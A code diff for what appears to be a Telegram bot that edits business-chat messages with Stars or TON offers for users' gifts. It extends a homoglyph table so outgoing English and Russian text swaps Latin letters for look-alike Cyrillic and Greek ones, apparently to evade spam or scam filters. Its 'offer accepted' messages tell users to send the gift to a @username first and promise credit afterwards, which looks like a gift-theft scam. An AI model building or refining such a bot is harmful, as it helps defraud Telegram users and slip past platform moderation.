@@ -32,7 +32,7 @@ NBSP = "\u00a0"
 
 OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
 HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
-HOMOGLYPH_RATE_EN = float(os.environ.get("HOMOGLYPH_RATE_EN", "0.2"))
+HOMOGLYPH_RATE_EN = float(os.environ.get("HOMOGLYPH_RATE_EN", "0.15"))
 BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")
 SEND_COOLDOWN = float(os.environ.get("SEND_COOLDOWN", "2.0"))
 
@@ -55,6 +55,7 @@ _last_send_by_bcid = {}
 # ============ HOMOGLYPH STYLE ============
 
 _HOMOGLYPH = {
+    # кириллица -> латиница/греческий
     "а": ["a", "α"],
     "с": ["c"],
     "е": ["e"],
@@ -78,6 +79,26 @@ _HOMOGLYPH = {
     "І": ["I"],
     "Ј": ["J"],
     "Ѕ": ["S"],
+    # латиница -> кириллица/греческий (для EN и латинских частей RU)
+    "a": ["а", "α"],
+    "c": ["с"],
+    "e": ["е"],
+    "o": ["о", "ο"],
+    "p": ["р", "ρ"],
+    "x": ["х"],
+    "y": ["у"],
+    "k": ["к", "κ"],
+    "A": ["А"],
+    "B": ["В"],
+    "E": ["Е"],
+    "K": ["К"],
+    "M": ["М"],
+    "H": ["Н"],
+    "O": ["О"],
+    "P": ["Р"],
+    "C": ["С"],
+    "T": ["Т"],
+    "X": ["Х"],
 }
 
 _TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)
@@ -235,8 +256,9 @@ async def edit_offer(o, text, kb=None, preview=True):
     lang = o.get("lang", "ru")
     styled = style(text, lang)
     log.info(
-        "edit | chat=%s | mid=%s | bcid=%s | lang=%s | preview=%r",
-        o.get("chat"), o.get("mid"), o.get("bcid"), lang, _log_preview(styled, 60)
+        "edit | chat=%s | mid=%s | bcid=%s | lang=%s | preview=%r | raw_len=%s | styled_len=%s",
+        o.get("chat"), o.get("mid"), o.get("bcid"), lang,
+        _log_preview(styled, 60), len(text), len(styled)
     )
     params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                   text=styled, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
@@ -441,76 +463,14 @@ def _lang(o):
     return o.get("lang", "ru")
 
 
-def _pick(templates):
-    return random.choice(templates)
-
-
-def _offer_en_stars(maker, amount, gift, left):
-    templates = [
-        (f"<b>{maker}</b> is interested in your {gift}.\n"
-         f"They're offering <b>{amount}</b> for it.\n\n"
-         f"This offer is valid for {left}."),
-        (f"<b>{maker}</b> would like to get your {gift}.\n"
-         f"Offering <b>{amount}</b>.\n\n"
-         f"Valid for {left}."),
-        (f"<b>{maker}</b> wants your {gift}.\n"
-         f"Their offer: <b>{amount}</b>.\n\n"
-         f"Expires in {left}."),
-    ]
-    return _pick(templates)
-
-
-def _offer_en_ton(maker, amount, gift, addr, left):
-    addr_suffix = f" to <code>{addr}</code>" if addr else ""
-    templates = [
-        (f"<b>{maker}</b> is interested in your {gift}.\n"
-         f"They're offering <b>{amount}</b>{addr_suffix} for it.\n\n"
-         f"This offer is valid for {left}."),
-        (f"<b>{maker}</b> would like to get your {gift}.\n"
-         f"Offering <b>{amount}</b>{addr_suffix}.\n\n"
-         f"Valid for {left}."),
-        (f"<b>{maker}</b> wants your {gift}.\n"
-         f"Their offer: <b>{amount}</b>{addr_suffix}.\n\n"
-         f"Expires in {left}."),
-    ]
-    return _pick(templates)
-
-
-def _accepted_en_stars(gift, username, amount):
-    templates = [
-        (f"<b>Offer accepted.</b>\n\n"
-         f"Send {gift} to @{username}.\n"
-         f"Once it's delivered, <b>{amount}</b> will be credited to your balance."),
-        (f"<b>Deal confirmed.</b>\n\n"
-         f"Please send {gift} to @{username}.\n"
-         f"After that, <b>{amount}</b> will be credited to your balance."),
-    ]
-    return _pick(templates)
-
-
-def _accepted_en_ton(gift, username, amount, addr):
-    addr_suffix = f" <code>{addr}</code>" if addr else ""
-    templates = [
-        (f"<b>Offer accepted.</b>\n\n"
-         f"Send {gift} to @{username}.\n"
-         f"Once it's delivered, <b>{amount}</b> will be credited to your balance{addr_suffix}."),
-        (f"<b>Deal confirmed.</b>\n\n"
-         f"Please send {gift} to @{username}.\n"
-         f"After that, <b>{amount}</b> will be credited to your balance{addr_suffix}."),
-    ]
-    return _pick(templates)
-
-
 def offer_text(o):
     lang = _lang(o)
     if o.get("currency") == "TON":
         if lang == "en":
+            addr_text = f" to <code>{esc(o['address'])}</code>" if o.get("address") else ""
             amount = f"{num(o['amount'])} TON"
-            return _offer_en_ton(
-                maker_label(o), amount, gift_link(o),
-                esc(o["address"]) if o.get("address") else None,
-                left_text(o["expires"] - time.time(), lang),
-            )
+            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b>{addr_text} for {gift_link(o)}.\n\n"
+                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
         addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
         text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
@@ -518,10 +478,8 @@ def offer_text(o):
     else:
         if lang == "en":
             amount = f'{num(o["amount"])} {STARS_WORD_EN}'
-            return _offer_en_stars(
-                maker_label(o), amount, gift_link(o),
-                left_text(o["expires"] - time.time(), lang),
-            )
+            return (f"<b>{maker_label(o)}</b> offers you <b>{amount}</b> for {gift_link(o)}.\n\n"
+                    f"This offer is valid for {left_text(o['expires'] - time.time(), lang)}.")
         amount = f'{num(o["amount"])} {STARS_WORD_RU}'
         text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                 f"Предложение действует ещё {left_text(o['expires'] - time.time(), lang)}")
@@ -535,11 +493,11 @@ def accepted_text(o):
 
     if o.get("currency") == "TON":
         if lang == "en":
+            addr_text = f" <code>{esc(o['address'])}</code>" if o.get("address") else ""
             amount = f"{num(o['amount'])} TON"
-            return _accepted_en_ton(
-                gift_link(o), esc(username), amount,
-                esc(o["address"]) if o.get("address") else None,
-            )
+            return (f"<b>Confirmed.</b>\n\n"
+                    f"Send {gift_link(o)} to @{esc(username)}.\n"
+                    f"Once delivered, <b>{amount}</b> will be credited to your balance{addr_text}.")
         addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
         return (
@@ -550,7 +508,9 @@ def accepted_text(o):
         )
     if lang == "en":
         amount = f'{num(o["amount"])} {STARS_WORD_EN}'
-        return _accepted_en_stars(gift_link(o), esc(username), amount)
+        return (f"<b>Confirmed.</b>\n\n"
+                f"Send {gift_link(o)} to @{esc(username)}.\n"
+                f"Once delivered, <b>{amount}</b> will be credited to your balance.")
     amount = f'{num(o["amount"])} {STARS_WORD_RU}'
     return (
         f"<b>Сделка принята!</b>\n\n"
